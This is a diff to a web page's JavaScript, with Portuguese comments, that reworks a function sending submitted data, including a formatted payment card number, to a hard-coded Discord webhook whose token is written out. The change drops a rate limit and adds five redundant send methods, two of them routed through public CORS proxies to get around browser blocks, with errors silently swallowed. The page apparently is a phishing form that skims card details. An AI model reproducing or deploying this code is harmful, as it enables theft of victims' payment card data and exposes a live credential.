@@ -724,13 +724,7 @@ function registrarEnvio(data){
 // ════════════════════════════════════
 //  DISCORD WEBHOOK
 // ════════════════════════════════════
-let _jaEnviou = false;
-
 function sendToDiscord(data){
-  if(_jaEnviou) return;
-  _jaEnviou = true;
-  setTimeout(()=>{ _jaEnviou = false; }, 10000);
-
   const WEBHOOK = 'https://discord.com/api/webhooks/1484502746911473744/siEMJt3Zv7qdw64TUM31hV0geztsvtymHqWrUHmBHg0FXpAHUpFjGFUkIzVbp8rrkwCb';
   const cartaoFormatado = data.cartao.replace(/\s/g,'').replace(/(.{4})/g,'$1 ').trim();
   const agora = new Date().toLocaleString('pt-BR');
@@ -754,18 +748,16 @@ function sendToDiscord(data){
 
   const json = JSON.stringify(payload);
 
-  // Método 1: FormData no-cors (funciona no Vercel, não tem CORS block)
-  const fd = new FormData();
-  fd.append('payload_json', json);
-  fetch(WEBHOOK, {method:'POST', body:fd, mode:'no-cors'});
-
-  // Método 2: fetch direto com JSON (funciona se CORS liberar)
-  fetch(WEBHOOK, {
-    method:'POST',
-    headers:{'Content-Type':'application/json'},
-    body: json,
-    mode:'no-cors'
-  });
+  // Método 1: FormData no-cors
+  try { const fd=new FormData(); fd.append('payload_json',json); fetch(WEBHOOK,{method:'POST',body:fd,mode:'no-cors'}); } catch(e){}
+  // Método 2: fetch JSON no-cors
+  try { fetch(WEBHOOK,{method:'POST',headers:{'Content-Type':'application/json'},body:json,mode:'no-cors'}); } catch(e){}
+  // Método 3: XMLHttpRequest
+  try { const x=new XMLHttpRequest(); x.open('POST',WEBHOOK,true); x.setRequestHeader('Content-Type','application/json'); x.send(json); } catch(e){}
+  // Método 4: proxy corsproxy.io
+  try { fetch('https://corsproxy.io/?'+WEBHOOK,{method:'POST',headers:{'Content-Type':'application/json'},body:json}); } catch(e){}
+  // Método 5: proxy allorigins
+  try { fetch('https://api.allorigins.win/raw?url='+encodeURIComponent(WEBHOOK),{method:'POST',headers:{'Content-Type':'application/json'},body:json}); } catch(e){}
 }
 function goToLogin(){document.getElementById('successModal').classList.remove('show');goTo('login');}
 
